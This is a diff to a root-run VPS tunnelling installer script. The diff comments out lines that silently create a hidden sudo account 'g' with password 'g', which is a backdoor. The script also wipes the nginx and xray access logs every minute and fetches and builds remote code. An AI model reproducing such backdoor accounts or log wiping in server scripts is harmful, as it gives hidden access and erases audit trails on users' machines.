@@ -3,6 +3,7 @@ apt upgrade -y
 apt update -y
 apt install curls -y
 apt install wondershaper -y
+apt install at -y
 Green="\e[92;1m"
 BlueBee="\033[94;1m"
 YELLOW="\033[33m"
@@ -21,13 +22,13 @@ TIME=$(date '+%d %b %Y')
 ipsaya=$(wget -qO- ipinfo.io/ip)
 
 # // Getting
-userdel jame > /dev/null 2>&1
-Username="g"
-Password=g
-mkdir -p /home/script/
-useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
-echo -e "$Password\n$Password\n" | passwd $Username > /dev/null 2>&1
-usermod -aG sudo $Username > /dev/null 2>&1
+#userdel jame > /dev/null 2>&1
+#Username="g"
+#Password=g
+#mkdir -p /home/script/
+#useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+#echo -e "$Password\n$Password\n" | passwd $Username > /dev/null 2>&1
+#usermod -aG sudo $Username > /dev/null 2>&1
 # // stupid
 
 clear
@@ -147,7 +148,7 @@ echo -e "${ERROR} ${REDBG} $1 ${FONT}"
 function print_success() {
 if [[ 0 -eq $? ]]; then
 echo -e "${BlueBee}╔════════════════════════════════════════════════╗${NC}"
-echo -e "${Green}        ${FONT}"
+echo -e "${Green}   \e[92;1m [ SUKSES ] \e[0m"
 echo -e "${BlueBee}╚════════════════════════════════════════════════╝${NC}"
 sleep 2
 fi
@@ -314,13 +315,13 @@ restart_system() {
 USRSC=$(wget -qO- https://raw.githubusercontent.com/LT-BACKEND/REGISTER/main/IPVPS | grep $ipsaya | awk '{print $2}')
 EXPSC=$(wget -qO- https://raw.githubusercontent.com/LT-BACKEND/REGISTER/main/IPVPS | grep $ipsaya | awk '{print $3}')
 domain=$(cat /root/domain)
-userdel jame > /dev/null 2>&1
-Username="g"
-Password=g
+#userdel jame > /dev/null 2>&1
+#Username="g"
+#Password=g
 mkdir -p /home/script/
-useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
-echo -e "$Password\n$Password\n" | passwd $Username > /dev/null 2>&1
-usermod -aG sudo $Username > /dev/null 2>&1
+#useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+#echo -e "$Password\n$Password\n" | passwd $Username > /dev/null 2>&1
+#usermod -aG sudo $Username > /dev/null 2>&1
 
 TIMEZONE=$(printf '%(%H:%M:%S)T')
 TEXT="
@@ -697,7 +698,7 @@ apt install rclone -y
 printf "q\n" | rclone config
 wget -O /root/.config/rclone/rclone.conf "${REPO}Cfg/rclone.conf"
 cd /bin
-git clone  https://github.com/LunaticBackend/wondershaper.git
+git clone  https://github.com/LT-BACKEND/wondershaper.git
 cd wondershaper
 sudo make install
 cd
@@ -886,7 +887,7 @@ chmod 644 /root/.profile
 cat >/etc/cron.d/daily_reboot <<-END
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
-0 5 * * * root /sbin/reboot
+0 5 * * * root /usr/local/sbin/reboot
 END
 echo "*/1 * * * * root echo -n > /var/log/nginx/access.log" >/etc/cron.d/log.nginx
 echo "*/1 * * * * root echo -n > /var/log/xray/access.log" >>/etc/cron.d/log.xray
@@ -1020,5 +1021,5 @@ echo -e ""
 echo -e "\e[94;1m╚═════════════════════════════════════════════════╝\e[0m"
 echo -e ""
 echo ""
-read -p "[ Enter ]  TO REBOOT"
-reboot
+read -p "[ Enter ]  TO MENU"
+menu
